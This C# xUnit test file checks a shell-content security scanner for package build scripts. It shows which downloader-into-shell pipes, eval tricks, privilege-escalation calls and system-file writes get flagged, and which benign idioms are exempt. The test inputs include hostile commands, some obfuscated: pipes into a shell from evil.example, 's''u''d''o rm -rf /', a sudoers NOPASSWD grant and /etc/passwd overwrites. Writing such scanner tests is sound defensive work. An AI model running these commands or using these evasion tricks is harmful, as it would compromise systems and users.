using Atoll.Api.Services.Security;
using Atoll.Api.Services.Security.Scanning;
using Xunit;

namespace Atoll.Api.Tests.Security.Scanning;

public class ShellContentScannerTests
{
    private static List<SecurityFinding> Scan(string content, string path = "PKGBUILD")
    {
        return [.. ShellContentScanner.Scan(content, path)];
    }

    private static SecurityFinding SingleFinding(string content, string ruleId, string path = "PKGBUILD")
    {
        var matches = Scan(content, path).Where(f => f.RuleId == ruleId).ToList();
        Assert.Single(matches);
        return matches[0];
    }

    private static void AssertHasFinding(string content, string ruleId, FindingSeverity severity, string path = "PKGBUILD")
    {
        var findings = Scan(content, path);
        Assert.Contains(findings, f => f.RuleId == ruleId && f.Severity == severity);
    }

    [Theory]
    [InlineData("curl http://x | sh")]
    [InlineData("wget http://x | sh")]
    [InlineData("wget2 http://x | sh")]
    [InlineData("aria2c http://x | sh")]
    [InlineData("fetch http://x | sh")]
    [InlineData("lynx http://x | sh")]
    [InlineData("httpie http://x | sh")]
    [InlineData("http http://x | sh")]
    public void Network_to_shell_matches_all_known_downloaders(string content)
    {
        AssertHasFinding(content, "network-to-shell", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("curl http://x | sh")]
    [InlineData("curl http://x | bash")]
    [InlineData("curl http://x | zsh")]
    [InlineData("curl http://x | dash")]
    [InlineData("curl http://x | ksh")]
    [InlineData("curl http://x | fish")]
    public void Network_to_shell_matches_all_known_shells(string content)
    {
        AssertHasFinding(content, "network-to-shell", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("echo aGVsbG8= | base64 -d | sh")]
    [InlineData("echo aGVsbG8= | base64 | bash")]
    [InlineData("xxd -r file | sh")]
    public void Decode_to_shell_flags_decoders_piped_into_shell(string content)
    {
        AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("eval $(python -c 'import os')")]
    [InlineData("eval `ssh host cmd`")]
    [InlineData("eval base64 -d")]
    // source builtin fed by a download
    [InlineData(". $(curl http://x/cmd)")]
    // echo fed by a download stays critical
    [InlineData("eval echo $(curl http://x/cmd)")]
    public void Eval_indirection_flags_dynamic_command_execution(string content)
    {
        AssertHasFinding(content, "eval-indirection", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("eval $(opam env)")]
    [InlineData("eval $(opam env --switch=$pkgname --set-switch)")]
    [InlineData("eval $(makepkg -g --noprepare -do -p $f)")]
    [InlineData("eval $(dbus-launch --sh-syntax)")]
    [InlineData("eval `pifpaf run httpbin --port 64051`")]
    [InlineData("eval $(perl -V:sitearch)")]
    [InlineData("eval $(grep -E '^arch=' PKGBUILD)")]
    [InlineData("eval $(cat /proc/meminfo | awk '/^MemTotal/ {print $2}')")]
    // hardware monitor output feeding local parsers (baraction.sh)
    [InlineData("eval $(sensors 2>/dev/null | sed 's/  */ /g' | awk '{print $1}')")]
    [InlineData("eval $(./get_latest $archs)")]
    [InlineData("eval $(\"${ENVY_BIN}\" session)")]
    [InlineData("eval $(cat cmd)")]
    // source builtin with command substitution
    [InlineData(". $(cat cmd)")]
    // tilde-of-user idiom
    [InlineData("SUDO_HOME=$(eval echo ~$SUDO_USER)")]
    // indirect variable name via eval echo
    [InlineData("_last_modified=$(eval echo \\${_last_modified_${CARCH}})")]
    // echo of a local parser's output
    [InlineData("eval echo -n `grep -oP 'VERSION' CMakeLists.txt`")]
    public void Eval_indirection_downgrades_established_idioms_to_medium(string content)
    {
        AssertHasFinding(content, "eval-indirection", FindingSeverity.Medium);
    }

    [Theory]
    // 'source' is part of English display text
    [InlineData("pkgdesc=\"An open source EchoLink proxy for Linux and Windows\"")]
    // keyword after a plain word is an argument mention, not a command
    [InlineData("Description=Open Source EchoLink Proxy")]
    // 'source' inside a printf format string is display text
    [InlineData("printf \"You need to source $(tput setaf 2)/etc/profile$(tput sgr0) to continue\"")]
    // standalone '.' separator between echo arguments
    [InlineData("echo $(grep -oP 'VERSION \\S+' CMakeLists.txt) .r $(git rev-list --count HEAD) . $(git rev-parse --short HEAD)")]
    public void Eval_indirection_ignores_display_text_and_argument_mentions(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Any(f => f.RuleId == "eval-indirection"),
            $"Unexpected eval-indirection finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Eval_indirection_after_control_keyword_stays_flagged()
    {
        // 'then' directly precedes an invoked command: this is a real eval in command position.
        AssertHasFinding("if true; then eval $(python -c 'x'); fi", "eval-indirection", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("pkgver=$(date +%s)")]
    [InlineData("pkgver=`date +%s`")]
    public void Command_substitution_matches_dollar_paren_and_backtick(string content)
    {
        AssertHasFinding(content, "command-substitution", FindingSeverity.Medium);
    }

    [Theory]
    [InlineData("cmd=${!target}")]
    public void Variable_indirection_flags_bash_indirect_expansion(string content)
    {
        AssertHasFinding(content, "variable-indirection", FindingSeverity.Medium);
    }

    [Theory]
    // redirect to /etc
    [InlineData("echo x > /etc/passwd")]
    // append to /usr
    [InlineData("echo x >> /usr/bin/foo")]
    // /bin
    [InlineData("echo x > /bin/tool")]
    // /sbin
    [InlineData("echo x > /sbin/tool")]
    // /var
    [InlineData("echo x > /var/log/x")]
    // /root
    [InlineData("echo x > /root/.bashrc")]
    // /opt
    [InlineData("echo x > /opt/x")]
    // /boot
    [InlineData("echo x > /boot/x")]
    // /lib
    [InlineData("echo x > /lib/x")]
    // tee with /etc
    [InlineData("tee /etc/foo")]
    // tee with /home
    [InlineData("tee /home/user/.bashrc")]
    public void Write_outside_build_root_flags_system_path_writes(string content)
    {
        AssertHasFinding(content, "write-outside-build-root", FindingSeverity.High);
    }

    [Theory]
    // relative path - inside build root
    [InlineData("echo x > ./local")]
    // $pkgdir is inside the build root
    [InlineData("echo x > $pkgdir/foo")]
    public void Write_outside_build_root_ignores_relative_and_pkgdir_paths(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Any(f => f.RuleId == "write-outside-build-root"),
            $"Unexpected write-outside-build-root finding. Got: {string.Join(", ", findings.Select(f => f.RuleId))}");
    }

    [Theory]
    [InlineData("curl http://x | python evil.py")]
    [InlineData("curl http://x | perl evil.pl")]
    [InlineData("curl http://x | ruby evil.rb")]
    [InlineData("curl http://x | node evil.js")]
    [InlineData("curl http://x | eval")]
    public void Network_execution_matches_known_interpreters(string content)
    {
        AssertHasFinding(content, "network-execution", FindingSeverity.High);
    }

    [Theory]
    // uninstall help text in an echo
    [InlineData("echo \"    curl -fsSL https://example.com/uninstall.sh | bash -s -- --purge --yes\"")]
    // displayed command note
    [InlineData("echo \"Script: curl -fsSL https://example.com/install | bash\"")]
    // optdepends-style note in a single-quoted string
    [InlineData("'foo-bin: Foo CLI (alternatively install upstream: curl -fsSL https://example.com/install.sh | sh -s -- -v)'")]
    // usage string containing a literal pipe into 'sh'
    [InlineData("echo \"Usage: $0 {g|sh|ag} [-c|--clear]\"")]
    public void Network_rules_ignore_quoted_display_text(string content)
    {
        var findings = Scan(content);
        Assert.False(
            findings.Any(f => f.RuleId is "network-to-shell" or "network-execution" or "decode-to-shell"),
            $"Unexpected network rule finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Network_pipe_inside_quoted_command_substitution_stays_flagged()
    {
        // A substitution inside double quotes still executes: only display-text pipes
        // are suppressed.
        AssertHasFinding("echo \"$(curl http://x | sh)\"", "network-to-shell", FindingSeverity.Critical);
    }

    [Theory]
    // release-tag scraping with a -pe line filter
    [InlineData("curl -s https://github.com/org/repo/releases/latest | perl -pe 's!.*/tag/v?([0-9].+)!!'")]
    // HTML scraping with -n and separate -e
    [InlineData("_source=$(curl -s \"$url\" | perl -n -e 's/x/y/ && print')")]
    // switch cluster containing e
    [InlineData("curl http://x | perl -wne 'print if /v/'")]
    public void Network_execution_ignores_perl_inline_text_filters(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Any(f => f.RuleId == "network-execution"),
            $"Unexpected network-execution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // bare perl executes stdin
    [InlineData("curl http://x | perl")]
    // lone dash reads the program from stdin
    [InlineData("curl http://x | perl -")]
    // module flag provides no program source
    [InlineData("curl http://x | perl -MFile::Spec")]
    // -p without -e or a file still reads stdin
    [InlineData("curl http://x | perl -p")]
    public void Network_execution_still_flags_perl_without_inline_program(string content)
    {
        AssertHasFinding(content, "network-execution", FindingSeverity.High);
    }

    [Fact]
    public void Obfuscated_network_execution_into_perl_filter_stays_critical()
    {
        // The perl-filter exemption applies to plainly visible constructs only; hiding the
        // tool names keeps the obfuscation escalation.
        var finding = SingleFinding("c''url http://x | p''erl -pe 's/a/b/'", "network-execution");
        Assert.Equal(FindingSeverity.Critical, finding.Severity);
    }

    [Theory]
    [InlineData("echo yes | bash build_foo --console")]
    [InlineData("echo n | bash ./install.sh --prefix=\"$pkgdir\" > /dev/null")]
    [InlineData("printf '%s\\n' 'yes' ${prefix} | bash \"${srcdir}/installer\" | tee")]
    [InlineData("echo y | sh /opt/installer.sh")]
    public void Decode_to_shell_ignores_answer_feeding_into_local_scripts(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Any(f => f.RuleId == "decode-to-shell"),
            $"Unexpected decode-to-shell finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // bare shell reads the pipe as its script
    [InlineData("echo 'aGVsbG8=' | bash")]
    // -s reads commands from stdin
    [InlineData("echo x | bash -s -- -y")]
    public void Decode_to_shell_still_flags_stdin_execution(string content)
    {
        AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
    }

    [Theory]
    [InlineData("sudo cmd", "sudo")]
    [InlineData("sudoedit /etc/sudoers", "sudoedit")]
    [InlineData("doas cmd", "doas")]
    [InlineData("pkexec cmd", "pkexec")]
    [InlineData("run0 cmd", "run0")]
    [InlineData("su root -c 'evil'", "su")]
    public void Privilege_escalation_flags_all_privilege_tools(string content, string tool)
    {
        var findings = Scan(content);
        var finding = findings.FirstOrDefault(f => f.RuleId == "privilege-escalation");
        Assert.NotNull(finding);
        Assert.Equal(FindingSeverity.High, finding!.Severity);
        Assert.Contains(tool, finding.Message);
    }

    [Theory]
    // sudo substring but not invoked
    [InlineData("echo pseudo sudoku")]
    // display text in single quotes
    [InlineData("echo 'sudo'")]
    // display text in double quotes
    [InlineData("echo \"sudo is a tool\"")]
    public void Privilege_escalation_rejects_substring_and_display_matches(string content)
    {
        var findings = Scan(content);
        Assert.DoesNotContain(findings, f => f.RuleId == "privilege-escalation");
    }

    [Theory]
    // cd into a tool
    [InlineData("cd sudo")]
    // sudos-eyes: the packaged file is named sudo
    [InlineData("install -Dm755 sudo \"$pkgdir/usr/lib/sudos-eyes/sudo\"")]
    // word list names the tools it looks for
    [InlineData("for _gsu in pkexec kdesu gksu; do")]
    // the command is echo: the sudo is its argument
    [InlineData("echo sudo sed -i 's/active = no/active = yes/g' /etc/audit/plugins.d/af_unix.conf")]
    // prose in a scriptlet's message
    [InlineData("avahi should be enabled first with: sudo systemctl restart avahi-daemon")]
    // shell-prompt illustration
    [InlineData("echo   $ sudo modprobe libcomposite")]
    public void Privilege_escalation_rejects_tool_names_in_argument_position(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Any(f => f.RuleId == "privilege-escalation"),
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // control keyword
    [InlineData("if sudo visudo -c -f /etc/sudoers.d/pyhotspot; then")]
    // elif
    [InlineData("elif sudo -l | grep -qw ALL; then")]
    // case branch body
    [InlineData("3) sudo pacman -S --needed vulkan-nouveau ;;")]
    // exec prefix
    [InlineData("exec pkexec bash -c 'true'")]
    // re-exec guard
    [InlineData("[ $(id -u) -eq 0 ] || exec sudo $0 $@")]
    // piped into sudo's stdin
    [InlineData("gpg -dq ~/.ssh/pass.gpg | sudo -S -v")]
    // modifier past its option and value
    [InlineData("nice -n 10 sudo make install")]
    // env prefix through options and assignments
    [InlineData("env -i FOO=bar sudo make install")]
    // assignment prefix runs the command
    [InlineData("FOO=bar sudo make install")]
    // pipe into sudo
    [InlineData("generate-config | sudo -u dendrite tee /etc/dendrite/config.yaml")]
    // the argument mention is skipped, the live invocation still flags
    [InlineData("cd sudo && sudo make install")]
    public void Privilege_escalation_still_flags_tools_in_command_position(string content)
    {
        AssertHasFinding(content, "privilege-escalation", FindingSeverity.High);
    }

    [Fact]
    public void Obfuscated_tool_name_in_argument_position_still_escalates()
    {
        // Structural exemptions cover plainly visible constructs only: a hidden tool name is
        // intent evidence wherever it sits.
        var finding = SingleFinding("cd s''u''d''o", "privilege-escalation");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    // function argument names the tool (corpus: 472 packages)
    [InlineData("_install_module curl")]
    // loop variable, not the node runner
    [InlineData("for node in ast.walk(tree):")]
    // prose package list
    [InlineData("base-devel wget curl sudo git tar yajl")]
    public void Tool_rules_reject_words_in_argument_position(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Any(f => f.RuleId is "risky-tool" or "privilege-escalation"),
            $"Unexpected tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // python executes the -m module
    [InlineData("python -m pip install --upgrade pip")]
    // xargs runs what it is handed
    [InlineData("xargs curl --remote-name-all < libraries.txt")]
    // the leading risky tool alone flags the line
    [InlineData("uv pip install --system dist/*.whl")]
    public void Risky_tool_still_flags_tools_reached_through_another_command(string content)
    {
        AssertHasFinding(content, "risky-tool", FindingSeverity.Medium);
    }

    [Theory]
    // dependency arrays name tools without invoking them (eddie-ui)
    [InlineData("depends=(mono curl openvpn sudo polkit libnotify libayatana-appindicator)", "PKGBUILD")]
    [InlineData("makedepends=(git curl)", "PKGBUILD")]
    // arch-qualified array
    [InlineData("depends_x86_64=(sudo curl)", "PKGBUILD")]
    [InlineData("optdepends=(sudo)", "PKGBUILD")]
    // obfuscated mention is still just an assigned word
    [InlineData(@"depends=(s\u\do)", "PKGBUILD")]
    // plain shell arrays in helper scripts are data too
    [InlineData("tools=(sudo curl)", "helper.sh")]
    public void Tool_mentions_inside_array_assignments_are_not_invocations(string content, string path)
    {
        var findings = Scan(content, path);
        Assert.False(findings.Any(f => f.RuleId is "privilege-escalation" or "risky-tool"),
            $"Unexpected findings. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Multi_line_array_values_are_data_until_the_closing_paren()
    {
        var content = string.Join("\n",
            "depends=(",
            "    mono",
            "    curl",
            "",
            "    sudo",
            ")",
            "build() {",
            "    sudo make install",
            "}");

        var findings = Scan(content);
        var sudo = findings.Where(f => f.RuleId == "privilege-escalation").ToList();
        Assert.Single(sudo);
        Assert.Equal(FindingSeverity.High, sudo[0].Severity);
        Assert.Contains("sudo make install", sudo[0].Snippet);
        Assert.DoesNotContain(findings, f => f.RuleId == "risky-tool" && f.Message.Contains("curl"));
    }

    [Fact]
    public void Live_invocation_after_array_data_on_the_same_line_still_flags()
    {
        var finding = SingleFinding("depends=(sudo) && sudo make install", "privilege-escalation");
        Assert.Equal(FindingSeverity.High, finding.Severity);
    }

    [Theory]
    [InlineData("depends=($(sudo true))", "privilege-escalation", FindingSeverity.High)]
    [InlineData("depends=($(curl -fsSL https://evil.example/x))", "risky-tool", FindingSeverity.Medium)]
    public void Command_substitutions_inside_arrays_stay_live(string content, string ruleId, FindingSeverity severity)
    {
        AssertHasFinding(content, ruleId, severity);
    }

    [Fact]
    public void Eval_keyword_inside_array_data_is_not_flagged()
    {
        var findings = Scan("depends=(. $(cat deps.txt))");
        Assert.False(findings.Any(f => f.RuleId == "eval-indirection"),
            $"Unexpected eval-indirection finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Visible_array_data_does_not_hide_a_later_obfuscated_invocation()
    {
        var finding = SingleFinding("depends=(curl mirror) && c''url https://evil.example", "risky-tool");
        Assert.Equal(FindingSeverity.Critical, finding.Severity);
    }

    [Fact]
    public void Array_introducer_inside_quoted_display_text_never_opens_a_value()
    {
        var findings = Scan("echo \"depends=(sudo)\"");
        Assert.DoesNotContain(findings, f => f.RuleId == "privilege-escalation");
    }

    [Theory]
    // redundant sudo
    [InlineData("sudo systemctl enable foo.service")]
    // su
    [InlineData("su $user -c 'systemctl --user daemon-reload'")]
    // pkexec
    [InlineData("pkexec modprobe acpi_call")]
    public void Privilege_escalation_in_install_scriptlet_is_downgraded_to_medium(string content)
    {
        // Scriptlets already run as root under alpm's control: the call is redundant,
        // not an escalation.
        var finding = SingleFinding(content, "privilege-escalation", "foo.install");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("scriptlet", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Obfuscated_privilege_escalation_in_install_scriptlet_is_downgraded_to_medium()
    {
        // The downgrade is contextual, not syntactic: scriptlets run as root whether or not
        // the tool name is obfuscated.
        var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation", "foo.install");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    // voluntarily-run helper script
    [InlineData("sudo systemctl restart foo.service", "check.sh")]
    // .bash helper script
    [InlineData("sudo apt update", "makedeb.bash")]
    public void Privilege_escalation_in_helper_scripts_is_downgraded_to_medium(string content, string path)
    {
        // Helper scripts ship in the package and only run when the user invokes them
        // voluntarily, typically as root: the escalation tool grants nothing the user
        // did not already hand over.
        var finding = SingleFinding(content, "privilege-escalation", path);

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("helper", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Obfuscated_privilege_escalation_in_helper_scripts_is_downgraded_to_medium()
    {
        // The downgrade is contextual, like the scriptlet one: helper scripts run only
        // when invoked voluntarily, obfuscated tool name or not.
        var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation", "check.sh");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Write_outside_build_root_in_helper_scripts_stays_high()
    {
        // At this layer there is no PKGBUILD to check references against (the
        // reference-aware downgrade lives in PkgBuildSecurityScanner), so system writes
        // (sudoers grants, authorized_keys injection) keep blocking.
        AssertHasFinding("echo 'yay ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "write-outside-build-root", FindingSeverity.High, "dockerscript.sh");
    }

    [Theory]
    // build-time invocation
    [InlineData("PKGBUILD")]
    // non-shell helper keeps the finding
    [InlineData("update.py")]
    public void Privilege_escalation_outside_install_and_helper_scripts_stays_high(string path)
    {
        AssertHasFinding("sudo systemctl enable foo.service", "privilege-escalation", FindingSeverity.High, path);
    }

    [Theory]
    [InlineData("npm install x")]
    [InlineData("npx create-app")]
    [InlineData("yarn add x")]
    [InlineData("pnpm install")]
    [InlineData("pip install x")]
    [InlineData("pip3 install x")]
    [InlineData("uv pip install x")]
    [InlineData("poetry install")]
    [InlineData("cargo install x")]
    [InlineData("go install example.com/x@latest")]
    [InlineData("docker run -it x")]
    [InlineData("podman run -it x")]
    [InlineData("kubectl apply -f x")]
    public void Risky_tool_flags_known_package_managers_and_runners(string content)
    {
        AssertHasFinding(content, "risky-tool", FindingSeverity.Medium);
    }

    [Fact]
    public void Risky_tool_inside_echo_string_is_not_flagged()
    {
        var findings = Scan("echo \"Run: curl http://example.com | sh to install\"");
        // curl|sh is display text inside double quotes - no risky-tool finding for curl.
        Assert.DoesNotContain(findings, f => f.RuleId == "risky-tool" && f.Message.Contains("curl"));
    }

    [Fact]
    public void Hidden_character_zero_width_is_flagged_as_medium()
    {
        // Zero-width chars cannot change shell tokenization, so they are review-only.
        AssertHasFinding("echo rm\u200Brf", "hidden-character", FindingSeverity.Medium);
        // 🏋️ = U+1F3CB U+FE0F U+200D U+2642 U+FE0F - the ZWJ joins the emoji sequence.
        AssertHasFinding("pkgdesc=\"\uD83C\uDFCB\uFE0F\u200D\u2642\uFE0F Training\"", "hidden-character", FindingSeverity.Medium);
    }

    [Fact]
    public void Hidden_character_bidi_override_stays_critical()
    {
        AssertHasFinding("pkgname=evil\u202Esh", "hidden-character", FindingSeverity.Critical);
    }

    [Fact]
    public void Hidden_character_control_char_outside_quotes_stays_critical()
    {
        AssertHasFinding("echo rm\u0001rf", "hidden-character", FindingSeverity.Critical);
    }

    [Fact]
    public void Ansi_escape_sequences_are_not_hidden_characters()
    {
        // Complete CSI sequences are terminal styling - skipped even unquoted.
        var findings = Scan("echo \u001b[96m${blinking:blink=! blink:1}\r\u001b[0m");
        Assert.False(findings.Any(f => f.RuleId == "hidden-character"),
            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Control_char_inside_quoted_display_text_is_not_flagged()
    {
        var findings = Scan("printf '%s\\n' \"python-poetry: support for Python packages using \u0016Poetry\"");
        Assert.False(findings.Any(f => f.RuleId == "hidden-character"),
            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Mojibake_c1_run_is_not_flagged()
    {
        // C1 bytes next to Latin-1 supplement characters are double-encoded UTF-8 file names.
        var findings = Scan("mv \"${pkgdir}/target/\"{\u00d1\u0082.cfg,\u0442.cfg}");
        Assert.False(findings.Any(f => f.RuleId == "hidden-character"),
            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Fact]
    public void Bare_escape_stays_critical_even_in_quotes()
    {
        // OSC-style escapes (ESC ] … BEL) can spoof the terminal even as echoed data.
        AssertHasFinding("echo \"\u001b]0;evil title\u0007\"", "hidden-character", FindingSeverity.Critical);
    }

    [Fact]
    public void Hidden_character_finding_snippet_is_the_trimmed_raw_line()
    {
        // The hidden char may appear before a trailing comment; the comment must remain in the snippet.
        var findings = Scan("echo rm\u200Brf # trailing");
        var finding = findings.First(f => f.RuleId == "hidden-character");

        Assert.Equal("echo rm\u200Brf # trailing", finding.Snippet);
    }

    [Fact]
    public void Obfuscated_privilege_escalation_escalates_to_critical()
    {
        // sudo is split with empty quotes - invisible to plain grep but visible after de-obfuscation.
        var finding = SingleFinding("s''u''d''o rm -rf /", "privilege-escalation");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Obfuscated_network_to_shell_escalates_to_critical()
    {
        var finding = SingleFinding("c''u''rl https://evil.example/x.sh | s''h", "network-to-shell");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
    }

    [Fact]
    public void Obfuscated_network_execution_escalates_to_critical()
    {
        var finding = SingleFinding("c''url https://evil.example/x | p''ython evil.py", "network-execution");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("pkgname=foo")]
    [InlineData("pkgver=1.0")]
    [InlineData("source=(https://example.com/foo.tar.gz::https://github.com/x/y/archive/v1.0.tar.gz)")]
    public void Scan_produces_no_findings_for_benign_content(string content)
    {
        Assert.Empty(Scan(content));
    }

    [Fact]
    public void Comment_only_line_produces_no_findings()
    {
        // The comment is stripped before any rule runs, so a malicious-looking construct inside a
        // comment must not be flagged.
        Assert.Empty(Scan("# curl http://x | sh"));
    }

    [Fact]
    public void Hash_inside_single_quotes_is_not_a_comment()
    {
        // The '#' here is literal text, not a comment - so the curl|sh inside is real and must be flagged.
        var findings = Scan("echo '# ${pkgver}' ; curl http://x | sh");

        Assert.Contains(findings, f => f.RuleId == "network-to-shell");
    }

    [Fact]
    public void Multiple_findings_on_one_line_are_emitted()
    {
        var findings = Scan("sudo curl http://x | sh");

        Assert.Contains("network-to-shell", findings.Select(f => f.RuleId));
        Assert.Contains("privilege-escalation", findings.Select(f => f.RuleId));
    }

    [Fact]
    public void Each_line_of_content_is_scanned_independently()
    {
        var findings = Scan("echo hello\nsudo whoami\necho done");

        var sudoFindings = findings.Where(f => f.RuleId == "privilege-escalation").ToList();
        Assert.Single(sudoFindings);
        Assert.Equal("sudo whoami", sudoFindings[0].Snippet);
    }

    [Fact]
    public void Path_is_preserved_in_each_finding()
    {
        var findings = Scan("sudo whoami", "subdir/foo.install");

        Assert.NotEmpty(findings);
        Assert.All(findings, f => Assert.Equal("subdir/foo.install", f.File));
    }

    [Fact]
    public void Snippet_is_trimmed_raw_line_even_when_indented()
    {
        var findings = Scan("   sudo whoami   ");

        Assert.Equal("sudo whoami", findings[0].Snippet);
    }

    [Fact]
    public void Scan_does_not_emit_duplicate_findings_for_one_rule_on_one_line()
    {
        // Two $() substitutions on one line should still produce only one command-substitution finding,
        // because the regex finds a single match (the first one) and the rule fires once per match.
        var findings = Scan("a=$(x); b=$(y)");

        var commandSubs = findings.Where(f => f.RuleId == "command-substitution").ToList();
        Assert.Single(commandSubs);
    }

    [Fact]
    public void Empty_lines_are_skipped()
    {
        var findings = Scan("\n\n   \n\nsudo whoami");

        Assert.True(findings.All(f => f.RuleId == "privilege-escalation"));
        Assert.Single(findings);
    }

    [Theory]
    // single-quoted literal passed to grep
    [InlineData("grep -F '$(build'")]
    // single-quoted display text
    [InlineData("echo 'run $(make)'")]
    // backticks inside single quotes
    [InlineData("echo '`date`'")]
    // single-quoted assignment
    [InlineData("pkgver='$(git describe)'")]
    public void Command_substitution_inside_single_quotes_is_not_flagged(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Any(f => f.RuleId == "command-substitution"),
            $"Unexpected command-substitution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // double-quoted substitution still executes
    [InlineData("echo \"now: $(date)\"")]
    // backticks inside double quotes still execute
    [InlineData("echo \"`date`\"")]
    // bare substitution
    [InlineData("pkgver=$(date +%s)")]
    public void Command_substitution_outside_single_quotes_is_still_flagged(string content)
    {
        AssertHasFinding(content, "command-substitution", FindingSeverity.Medium);
    }

    [Fact]
    public void Escaped_dollar_substitution_is_not_flagged()
    {
        // \$( never expands - the backslash is load-bearing, e.g. Makefile syntax in sed text.
        var findings = Scan("sed -i s/@X@/\\$(CFLAGS)/ Makefile");

        Assert.False(findings.Any(f => f.RuleId == "command-substitution"),
            $"Unexpected command-substitution finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // indirect expansion inside single quotes
    [InlineData("echo '${!var}'")]
    public void Variable_indirection_inside_single_quotes_is_not_flagged(string content)
    {
        var findings = Scan(content);
        Assert.DoesNotContain(findings, f => f.RuleId == "variable-indirection");
    }

    [Theory]
    // redirect text inside double quotes
    [InlineData("echo \" >> /etc/mkinitcpio.conf.\"")]
    // redirect text inside single quotes
    [InlineData("echo ' > /etc/passwd'")]
    // tee text inside double quotes
    [InlineData("msg2 \"  tee /etc/foo\"")]
    public void Write_outside_build_root_inside_quotes_is_not_flagged(string content)
    {
        var findings = Scan(content);
        Assert.False(findings.Any(f => f.RuleId == "write-outside-build-root"),
            $"Unexpected write-outside-build-root finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Theory]
    // redirect after a quoted argument is live
    [InlineData("echo x > /etc/passwd")]
    // redirect after closed quotes is live
    [InlineData("echo 'done' > /etc/passwd")]
    public void Write_outside_build_root_outside_quotes_is_still_flagged(string content)
    {
        AssertHasFinding(content, "write-outside-build-root", FindingSeverity.High);
    }

    [Theory]
    // shell registration
    [InlineData("echo /bin/zsh >> /etc/shells")]
    // generated key
    [InlineData("openssl rand 32 > /usr/share/foo/key")]
    // config write via tee
    [InlineData("echo config | tee /etc/foo.conf")]
    public void Write_outside_build_root_in_install_scriptlet_is_downgraded_to_medium(string content)
    {
        // Scriptlets run as root under alpm's control; writing system files from one is
        // the ordinary job of a scriptlet.
        var finding = SingleFinding(content, "write-outside-build-root", "foo.install");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("scriptlet", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Obfuscated_write_in_install_scriptlet_is_downgraded_to_medium()
    {
        // upak-style: the backslash before '/' makes the match visible only after
        // normalization, but the scriptlet context still applies.
        var finding = SingleFinding("echo \"/opt/x/upak/doc\" > \\/root/upak_help_path", "write-outside-build-root", "upak.install");

        Assert.Equal(FindingSeverity.Medium, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    // voluntarily-run helper script
    [InlineData("helper.sh")]
    // build-time write
    [InlineData("PKGBUILD")]
    public void Write_outside_build_root_outside_install_scriptlets_stays_high(string path)
    {
        AssertHasFinding("echo /bin/zsh >> /etc/shells", "write-outside-build-root", FindingSeverity.High, path);
    }

    [Fact]
    public void Obfuscated_write_outside_install_scriptlets_stays_critical()
    {
        var finding = SingleFinding("echo x > \\/root/marker", "write-outside-build-root", "helper.sh");

        Assert.Equal(FindingSeverity.Critical, finding.Severity);
        Assert.Contains("obfuscated", finding.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
